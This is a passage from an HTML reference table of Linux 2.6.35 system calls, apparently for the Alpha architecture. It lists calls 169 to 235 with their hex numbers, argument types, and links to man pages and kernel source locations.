<td><a href="http://lxr.free-electrons.com/source/fs/select.c?v=2.6.35#L915" target="_blank" rel="external">fs/select.c:915</a></td>
</tr>
<tr>
<td>169</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/nfsservctl.2.html" target="_blank" rel="external">sys_nfsservctl</a></td>
<td>0xa9</td>
<td>int cmd</td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/nfsd/syscall.h?v=2.6.35#L77" target="_blank" rel="external">struct nfsctl_arg __user *arg</a></td>
<td>void __user *res</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/nfsctl.c?v=2.6.35#L86" target="_blank" rel="external">fs/nfsctl.c:86</a></td>
</tr>
<tr>
<td>170</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setresgid16.2.html" target="_blank" rel="external">sys_setresgid16</a></td>
<td>0xaa</td>
<td>old_gid_t rgid</td>
<td>old_gid_t egid</td>
<td>old_gid_t sgid</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L96" target="_blank" rel="external">kernel/uid16.c:96</a></td>
</tr>
<tr>
<td>171</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getresgid16.2.html" target="_blank" rel="external">sys_getresgid16</a></td>
<td>0xab</td>
<td>old_gid_t __user *rgid</td>
<td>old_gid_t __user *egid</td>
<td>old_gid_t __user *sgid</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L106" target="_blank" rel="external">kernel/uid16.c:106</a></td>
</tr>
<tr>
<td>172</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/prctl.2.html" target="_blank" rel="external">sys_prctl</a></td>
<td>0xac</td>
<td>int option</td>
<td>unsigned long arg2</td>
<td>unsigned long arg3</td>
<td>unsigned long arg4</td>
<td>unsigned long arg5</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1466" target="_blank" rel="external">kernel/sys.c:1466</a></td>
</tr>
<tr>
<td>173</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_sigreturn.2.html" target="_blank" rel="external">sys_rt_sigreturn</a></td>
<td>0xad</td>
<td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/ptrace.h?v=2.6.35#L19" target="_blank" rel="external">struct pt_regs *</a></td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/arch/alpha/kernel/entry.S?v=2.6.35#L771" target="_blank" rel="external">arch/alpha/kernel/entry.S:771</a></td>
</tr>
<tr>
<td>174</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_sigaction.2.html" target="_blank" rel="external">sys_rt_sigaction</a></td>
<td>0xae</td>
<td>int sig</td>
<td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/signal.h?v=2.6.35#L123" target="_blank" rel="external">const struct sigaction __user *act</a></td>
<td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/signal.h?v=2.6.35#L123" target="_blank" rel="external">struct sigaction __user *oact</a></td>
<td>size_t sigsetsize</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2624" target="_blank" rel="external">kernel/signal.c:2624</a></td>
</tr>
<tr>
<td>175</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_sigprocmask.2.html" target="_blank" rel="external">sys_rt_sigprocmask</a></td>
<td>0xaf</td>
<td>int how</td>
<td>sigset_t __user *set</td>
<td>sigset_t __user *oset</td>
<td>size_t sigsetsize</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2111" target="_blank" rel="external">kernel/signal.c:2111</a></td>
</tr>
<tr>
<td>176</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_sigpending.2.html" target="_blank" rel="external">sys_rt_sigpending</a></td>
<td>0xb0</td>
<td>sigset_t __user *set</td>
<td>size_t sigsetsize</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2171" target="_blank" rel="external">kernel/signal.c:2171</a></td>
</tr>
<tr>
<td>177</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_sigtimedwait.2.html" target="_blank" rel="external">sys_rt_sigtimedwait</a></td>
<td>0xb1</td>
<td>const sigset_t __user *uthese</td>
<td>siginfo_t __user *uinfo</td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116" target="_blank" rel="external">const struct timespec __user *uts</a></td>
<td>size_t sigsetsize</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2242" target="_blank" rel="external">kernel/signal.c:2242</a></td>
</tr>
<tr>
<td>178</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_sigqueueinfo.2.html" target="_blank" rel="external">sys_rt_sigqueueinfo</a></td>
<td>0xb2</td>
<td>int pid</td>
<td>int sig</td>
<td>siginfo_t __user *uinfo</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2404" target="_blank" rel="external">kernel/signal.c:2404</a></td>
</tr>
<tr>
<td>179</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_sigsuspend.2.html" target="_blank" rel="external">sys_rt_sigsuspend</a></td>
<td>0xb3</td>
<td>sigset_t __user *unewset</td>
<td>size_t sigsetsize</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2710" target="_blank" rel="external">kernel/signal.c:2710</a></td>
</tr>
<tr>
<td>180</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pread64.2.html" target="_blank" rel="external">sys_pread64</a></td>
<td>0xb4</td>
<td>unsigned int fd</td>
<td>char __user *buf</td>
<td>size_t count</td>
<td>loff_t pos</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/not%20found?v=2.6.35#L" target="_blank" rel="external">not found:</a></td>
</tr>
<tr>
<td>181</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pwrite64.2.html" target="_blank" rel="external">sys_pwrite64</a></td>
<td>0xb5</td>
<td>unsigned int fd</td>
<td>const char __user *buf</td>
<td>size_t count</td>
<td>loff_t pos</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/not%20found?v=2.6.35#L" target="_blank" rel="external">not found:</a></td>
</tr>
<tr>
<td>182</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/chown16.2.html" target="_blank" rel="external">sys_chown16</a></td>
<td>0xb6</td>
<td>const char __user *filename</td>
<td>old_uid_t user</td>
<td>old_gid_t group</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L19" target="_blank" rel="external">kernel/uid16.c:19</a></td>
</tr>
<tr>
<td>183</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getcwd.2.html" target="_blank" rel="external">sys_getcwd</a></td>
<td>0xb7</td>
<td>char __user *buf</td>
<td>unsigned long size</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/dcache.c?v=2.6.35#L2104" target="_blank" rel="external">fs/dcache.c:2104</a></td>
</tr>
<tr>
<td>184</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/capget.2.html" target="_blank" rel="external">sys_capget</a></td>
<td>0xb8</td>
<td>cap_user_header_t header</td>
<td>cap_user_data_t dataptr</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/capability.c?v=2.6.35#L161" target="_blank" rel="external">kernel/capability.c:161</a></td>
</tr>
<tr>
<td>185</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/capset.2.html" target="_blank" rel="external">sys_capset</a></td>
<td>0xb9</td>
<td>cap_user_header_t header</td>
<td>const cap_user_data_t data</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/capability.c?v=2.6.35#L235" target="_blank" rel="external">kernel/capability.c:235</a></td>
</tr>
<tr>
<td>186</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sigaltstack.2.html" target="_blank" rel="external">sys_sigaltstack</a></td>
<td>0xba</td>
<td>const stack_t __user *</td>
<td>stack_t __user *</td>
<td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/ptrace.h?v=2.6.35#L19" target="_blank" rel="external">struct pt_regs *</a></td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/arch/alpha/kernel/signal.c?v=2.6.35#L199" target="_blank" rel="external">arch/alpha/kernel/signal.c:199</a></td>
</tr>
<tr>
<td>187</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sendfile.2.html" target="_blank" rel="external">sys_sendfile</a></td>
<td>0xbb</td>
<td>int out_fd</td>
<td>int in_fd</td>
<td>off_t __user *offset</td>
<td>size_t count</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/read_write.c?v=2.6.35#L897" target="_blank" rel="external">fs/read_write.c:897</a></td>
</tr>
<tr>
<td>188</td>
<td>not implemented</td>
<td>0xbc</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td></td>
</tr>
<tr>
<td>189</td>
<td>not implemented</td>
<td>0xbd</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td></td>
</tr>
<tr>
<td>190</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/vfork.2.html" target="_blank" rel="external">sys_vfork</a></td>
<td>0xbe</td>
<td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/ptrace.h?v=2.6.35#L19" target="_blank" rel="external">struct pt_regs *</a></td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/arch/alpha/kernel/entry.S?v=2.6.35#L746" target="_blank" rel="external">arch/alpha/kernel/entry.S:746</a></td>
</tr>
<tr>
<td>191</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getrlimit.2.html" target="_blank" rel="external">sys_getrlimit</a></td>
<td>0xbf</td>
<td>unsigned int resource</td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/resource.h?v=2.6.35#L41" target="_blank" rel="external">struct rlimit __user *rlim</a></td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1237" target="_blank" rel="external">kernel/sys.c:1237</a></td>
</tr>
<tr>
<td>192</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mmap_pgoff.2.html" target="_blank" rel="external">sys_mmap_pgoff</a></td>
<td>0xc0</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/mm/mmap.c?v=2.6.35#L1091" target="_blank" rel="external">mm/mmap.c:1091</a></td>
</tr>
<tr>
<td>193</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/truncate64.2.html" target="_blank" rel="external">sys_truncate64</a></td>
<td>0xc1</td>
<td>const char __user *path</td>
<td>loff_t length</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/not%20found?v=2.6.35#L" target="_blank" rel="external">not found:</a></td>
</tr>
<tr>
<td>194</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ftruncate64.2.html" target="_blank" rel="external">sys_ftruncate64</a></td>
<td>0xc2</td>
<td>unsigned int fd</td>
<td>loff_t length</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/not%20found?v=2.6.35#L" target="_blank" rel="external">not found:</a></td>
</tr>
<tr>
<td>195</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/stat64.2.html" target="_blank" rel="external">sys_stat64</a></td>
<td>0xc3</td>
<td>char __user *filename</td>
<td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/stat.h?v=2.6.35#L25" target="_blank" rel="external">struct stat64 __user *statbuf</a></td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/stat.c?v=2.6.35#L358" target="_blank" rel="external">fs/stat.c:358</a></td>
</tr>
<tr>
<td>196</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/lstat64.2.html" target="_blank" rel="external">sys_lstat64</a></td>
<td>0xc4</td>
<td>char __user *filename</td>
<td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/stat.h?v=2.6.35#L25" target="_blank" rel="external">struct stat64 __user *statbuf</a></td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/stat.c?v=2.6.35#L369" target="_blank" rel="external">fs/stat.c:369</a></td>
</tr>
<tr>
<td>197</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fstat64.2.html" target="_blank" rel="external">sys_fstat64</a></td>
<td>0xc5</td>
<td>unsigned long fd</td>
<td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/stat.h?v=2.6.35#L25" target="_blank" rel="external">struct stat64 __user *statbuf</a></td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/stat.c?v=2.6.35#L380" target="_blank" rel="external">fs/stat.c:380</a></td>
</tr>
<tr>
<td>198</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/lchown.2.html" target="_blank" rel="external">sys_lchown</a></td>
<td>0xc6</td>
<td>const char __user *filename</td>
<td>uid_t user</td>
<td>gid_t group</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L583" target="_blank" rel="external">fs/open.c:583</a></td>
</tr>
<tr>
<td>199</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getuid.2.html" target="_blank" rel="external">sys_getuid</a></td>
<td>0xc7</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/timer.c?v=2.6.35#L1359" target="_blank" rel="external">kernel/timer.c:1359</a></td>
</tr>
<tr>
<td>200</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getgid.2.html" target="_blank" rel="external">sys_getgid</a></td>
<td>0xc8</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/timer.c?v=2.6.35#L1371" target="_blank" rel="external">kernel/timer.c:1371</a></td>
</tr>
<tr>
<td>201</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/geteuid.2.html" target="_blank" rel="external">sys_geteuid</a></td>
<td>0xc9</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/timer.c?v=2.6.35#L1365" target="_blank" rel="external">kernel/timer.c:1365</a></td>
</tr>
<tr>
<td>202</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getegid.2.html" target="_blank" rel="external">sys_getegid</a></td>
<td>0xca</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/timer.c?v=2.6.35#L1377" target="_blank" rel="external">kernel/timer.c:1377</a></td>
</tr>
<tr>
<td>203</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setreuid.2.html" target="_blank" rel="external">sys_setreuid</a></td>
<td>0xcb</td>
<td>uid_t ruid</td>
<td>uid_t euid</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L594" target="_blank" rel="external">kernel/sys.c:594</a></td>
</tr>
<tr>
<td>204</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setregid.2.html" target="_blank" rel="external">sys_setregid</a></td>
<td>0xcc</td>
<td>gid_t rgid</td>
<td>gid_t egid</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L484" target="_blank" rel="external">kernel/sys.c:484</a></td>
</tr>
<tr>
<td>205</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getgroups.2.html" target="_blank" rel="external">sys_getgroups</a></td>
<td>0xcd</td>
<td>int gidsetsize</td>
<td>gid_t __user *grouplist</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/groups.c?v=2.6.35#L203" target="_blank" rel="external">kernel/groups.c:203</a></td>
</tr>
<tr>
<td>206</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setgroups.2.html" target="_blank" rel="external">sys_setgroups</a></td>
<td>0xce</td>
<td>int gidsetsize</td>
<td>gid_t __user *grouplist</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/groups.c?v=2.6.35#L232" target="_blank" rel="external">kernel/groups.c:232</a></td>
</tr>
<tr>
<td>207</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fchown.2.html" target="_blank" rel="external">sys_fchown</a></td>
<td>0xcf</td>
<td>unsigned int fd</td>
<td>uid_t user</td>
<td>gid_t group</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L602" target="_blank" rel="external">fs/open.c:602</a></td>
</tr>
<tr>
<td>208</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setresuid.2.html" target="_blank" rel="external">sys_setresuid</a></td>
<td>0xd0</td>
<td>uid_t ruid</td>
<td>uid_t euid</td>
<td>uid_t suid</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L696" target="_blank" rel="external">kernel/sys.c:696</a></td>
</tr>
<tr>
<td>209</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getresuid.2.html" target="_blank" rel="external">sys_getresuid</a></td>
<td>0xd1</td>
<td>uid_t __user *ruid</td>
<td>uid_t __user *euid</td>
<td>uid_t __user *suid</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L746" target="_blank" rel="external">kernel/sys.c:746</a></td>
</tr>
<tr>
<td>210</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setresgid.2.html" target="_blank" rel="external">sys_setresgid</a></td>
<td>0xd2</td>
<td>gid_t rgid</td>
<td>gid_t egid</td>
<td>gid_t sgid</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L761" target="_blank" rel="external">kernel/sys.c:761</a></td>
</tr>
<tr>
<td>211</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getresgid.2.html" target="_blank" rel="external">sys_getresgid</a></td>
<td>0xd3</td>
<td>gid_t __user *rgid</td>
<td>gid_t __user *egid</td>
<td>gid_t __user *sgid</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L800" target="_blank" rel="external">kernel/sys.c:800</a></td>
</tr>
<tr>
<td>212</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/chown.2.html" target="_blank" rel="external">sys_chown</a></td>
<td>0xd4</td>
<td>const char __user *filename</td>
<td>uid_t user</td>
<td>gid_t group</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L539" target="_blank" rel="external">fs/open.c:539</a></td>
</tr>
<tr>
<td>213</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setuid.2.html" target="_blank" rel="external">sys_setuid</a></td>
<td>0xd5</td>
<td>uid_t uid</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L655" target="_blank" rel="external">kernel/sys.c:655</a></td>
</tr>
<tr>
<td>214</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setgid.2.html" target="_blank" rel="external">sys_setgid</a></td>
<td>0xd6</td>
<td>gid_t gid</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L531" target="_blank" rel="external">kernel/sys.c:531</a></td>
</tr>
<tr>
<td>215</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setfsuid.2.html" target="_blank" rel="external">sys_setfsuid</a></td>
<td>0xd7</td>
<td>uid_t uid</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L819" target="_blank" rel="external">kernel/sys.c:819</a></td>
</tr>
<tr>
<td>216</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setfsgid.2.html" target="_blank" rel="external">sys_setfsgid</a></td>
<td>0xd8</td>
<td>gid_t gid</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L852" target="_blank" rel="external">kernel/sys.c:852</a></td>
</tr>
<tr>
<td>217</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pivot_root.2.html" target="_blank" rel="external">sys_pivot_root</a></td>
<td>0xd9</td>
<td>const char __user *new_root</td>
<td>const char __user *put_old</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/namespace.c?v=2.6.35#L2184" target="_blank" rel="external">fs/namespace.c:2184</a></td>
</tr>
<tr>
<td>218</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mincore.2.html" target="_blank" rel="external">sys_mincore</a></td>
<td>0xda</td>
<td>unsigned long start</td>
<td>size_t len</td>
<td>unsigned char __user * vec</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/mm/mincore.c?v=2.6.35#L256" target="_blank" rel="external">mm/mincore.c:256</a></td>
</tr>
<tr>
<td>219</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/madvise.2.html" target="_blank" rel="external">sys_madvise</a></td>
<td>0xdb</td>
<td>unsigned long start</td>
<td>size_t len</td>
<td>int behavior</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/mm/madvise.c?v=2.6.35#L335" target="_blank" rel="external">mm/madvise.c:335</a></td>
</tr>
<tr>
<td>220</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getdents64.2.html" target="_blank" rel="external">sys_getdents64</a></td>
<td>0xdc</td>
<td>unsigned int fd</td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/dirent.h?v=2.6.35#L4" target="_blank" rel="external">struct linux_dirent64 __user *dirent</a></td>
<td>unsigned int count</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/readdir.c?v=2.6.35#L273" target="_blank" rel="external">fs/readdir.c:273</a></td>
</tr>
<tr>
<td>221</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fcntl64.2.html" target="_blank" rel="external">sys_fcntl64</a></td>
<td>0xdd</td>
<td>unsigned int fd</td>
<td>unsigned int cmd</td>
<td>unsigned long arg</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/fcntl.c?v=2.6.35#L452" target="_blank" rel="external">fs/fcntl.c:452</a></td>
</tr>
<tr>
<td>222</td>
<td>not implemented</td>
<td>0xde</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td></td>
</tr>
<tr>
<td>223</td>
<td>not implemented</td>
<td>0xdf</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td></td>
</tr>
<tr>
<td>224</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/gettid.2.html" target="_blank" rel="external">sys_gettid</a></td>
<td>0xe0</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/timer.c?v=2.6.35#L1493" target="_blank" rel="external">kernel/timer.c:1493</a></td>
</tr>
<tr>
<td>225</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/readahead.2.html" target="_blank" rel="external">sys_readahead</a></td>
<td>0xe1</td>
<td>int fd</td>
<td>loff_t offset</td>
<td>size_t count</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/not%20found?v=2.6.35#L" target="_blank" rel="external">not found:</a></td>
</tr>
<tr>
<td>226</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setxattr.2.html" target="_blank" rel="external">sys_setxattr</a></td>
<td>0xe2</td>
<td>const char __user *path</td>
<td>const char __user *name</td>
<td>const void __user *value</td>
<td>size_t size</td>
<td>int flags</td>
<td><a href="http://lxr.free-electrons.com/source/fs/xattr.c?v=2.6.35#L279" target="_blank" rel="external">fs/xattr.c:279</a></td>
</tr>
<tr>
<td>227</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/lsetxattr.2.html" target="_blank" rel="external">sys_lsetxattr</a></td>
<td>0xe3</td>
<td>const char __user *path</td>
<td>const char __user *name</td>
<td>const void __user *value</td>
<td>size_t size</td>
<td>int flags</td>
<td><a href="http://lxr.free-electrons.com/source/fs/xattr.c?v=2.6.35#L298" target="_blank" rel="external">fs/xattr.c:298</a></td>
</tr>
<tr>
<td>228</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fsetxattr.2.html" target="_blank" rel="external">sys_fsetxattr</a></td>
<td>0xe4</td>
<td>int fd</td>
<td>const char __user *name</td>
<td>const void __user *value</td>
<td>size_t size</td>
<td>int flags</td>
<td><a href="http://lxr.free-electrons.com/source/fs/xattr.c?v=2.6.35#L317" target="_blank" rel="external">fs/xattr.c:317</a></td>
</tr>
<tr>
<td>229</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getxattr.2.html" target="_blank" rel="external">sys_getxattr</a></td>
<td>0xe5</td>
<td>const char __user *path</td>
<td>const char __user *name</td>
<td>void __user *value</td>
<td>size_t size</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/xattr.c?v=2.6.35#L376" target="_blank" rel="external">fs/xattr.c:376</a></td>
</tr>
<tr>
<td>230</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/lgetxattr.2.html" target="_blank" rel="external">sys_lgetxattr</a></td>
<td>0xe6</td>
<td>const char __user *path</td>
<td>const char __user *name</td>
<td>void __user *value</td>
<td>size_t size</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/xattr.c?v=2.6.35#L390" target="_blank" rel="external">fs/xattr.c:390</a></td>
</tr>
<tr>
<td>231</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fgetxattr.2.html" target="_blank" rel="external">sys_fgetxattr</a></td>
<td>0xe7</td>
<td>int fd</td>
<td>const char __user *name</td>
<td>void __user *value</td>
<td>size_t size</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/xattr.c?v=2.6.35#L404" target="_blank" rel="external">fs/xattr.c:404</a></td>
</tr>
<tr>
<td>232</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/listxattr.2.html" target="_blank" rel="external">sys_listxattr</a></td>
<td>0xe8</td>
<td>const char __user *path</td>
<td>char __user *list</td>
<td>size_t size</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/xattr.c?v=2.6.35#L449" target="_blank" rel="external">fs/xattr.c:449</a></td>
</tr>
<tr>
<td>233</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/llistxattr.2.html" target="_blank" rel="external">sys_llistxattr</a></td>
<td>0xe9</td>
<td>const char __user *path</td>
<td>char __user *list</td>
<td>size_t size</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/xattr.c?v=2.6.35#L463" target="_blank" rel="external">fs/xattr.c:463</a></td>
</tr>
<tr>
<td>234</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/flistxattr.2.html" target="_blank" rel="external">sys_flistxattr</a></td>
<td>0xea</td>
<td>int fd</td>
<td>char __user *list</td>
<td>size_t size</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/xattr.c?v=2.6.35#L477" target="_blank" rel="external">fs/xattr.c:477</a></td>
</tr>
<tr>
<td>235</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/removexattr.2.html" target="_blank" rel="external">sys_removexattr</a></td>
<td>0xeb</td>
<td>const char __user *path</td>
<td>const char __user *name</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/xattr.c?v=2.6.35#L509" target="_blank" rel="external">fs/xattr.c:509</a></td>
</tr>
<tr>
<td>236</td>
